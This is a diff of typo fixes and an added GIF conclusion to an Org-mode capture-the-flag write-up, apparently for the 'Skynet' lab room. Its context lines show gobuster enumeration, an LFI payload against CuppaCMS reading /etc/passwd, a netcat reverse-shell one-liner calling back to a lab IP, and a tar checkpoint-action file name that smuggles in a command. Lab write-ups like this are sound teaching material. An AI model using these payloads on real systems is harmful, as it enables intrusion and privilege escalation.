@@ -4,7 +4,7 @@
 #+FILETAGS: 
 
 Yesterday I lost the opportunity to use "I'll be back" on my post's
-title. Unfortunate but I had not see ~Skynet~ in the list of my TODO
+title. Unfortunate but I had not seen ~Skynet~ in the list of my TODO
 rooms.
 
 * Reconnaissance
@@ -53,7 +53,7 @@ did not lose any more time, before launching gobuster:
 gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP -o gobuster.big
 #+end_src
 
-Whih, in turn, gave us some directories to check:
+That, in turn, gave us some directories to check:
 #+begin_example
 /.htaccess (Status: 403)
 /.htpasswd (Status: 403)
@@ -76,7 +76,7 @@ Sadly *searchsploit* did not reveal any usable exploits for that version
 (had it been for 1.4.22, we would have a perfectly fine RCE...shame)
 
 ** Samba enumeration
-Just from what we have seen already, we do not have any credentials or
+Just from what we have already seen, we do not have any credentials or
 information about the users of this machine. Putting web analysis and
 enumeration on hold for Samba might be the right move to make:
 
@@ -202,7 +202,7 @@ about. Again, enumeration is due:
 gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP/45kra24zxs28v3yd -o gobuster.big
 #+end_src
 
-Visiting ~/admiinistrator~ we get to a login page of *CuppaCMS*:
+Visiting ~/administrator~ we get to a login page of *CuppaCMS*:
 
 #+caption: Login page of Cuppa
 [[file:images/Reconnaissance/20231216_132854_screenshot.png]]
@@ -216,7 +216,7 @@ Apparently there is a readily available exploit in exploit-db: 25971.
 Using the following payload, as described in the exploit we found, we
 see that there is:
 1. LFI potential (we could maybe get a flag through that (?))
-2. PHP injection potential (a reverse shell might be nice as well)
+2. RFI potential (PHP injection) (a reverse shell might be nice as well)
 
 #+begin_example
 http://skynet.thm/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
@@ -278,7 +278,11 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.95.44 6970 >/tmp/
 echo "" > "--checkpoint-action=exec=bash shell.sh"
 #+end_src
 
+* Conclusion
 
+#+begin_export html
+<div class="tenor-gif-embed" data-postid="20118743" data-share-method="host" data-aspect-ratio="1.56863" data-width="100%"><a href="https://tenor.com/view/exterminador-do-futuro-gif-20118743">Exterminador Futuro GIF</a>from <a href="https://tenor.com/search/exterminador-gifs">Exterminador GIFs</a></div> <script type="text/javascript" async src="https://tenor.com/embed.js"></script>
+#+end_export
 
 * Footnotes
 
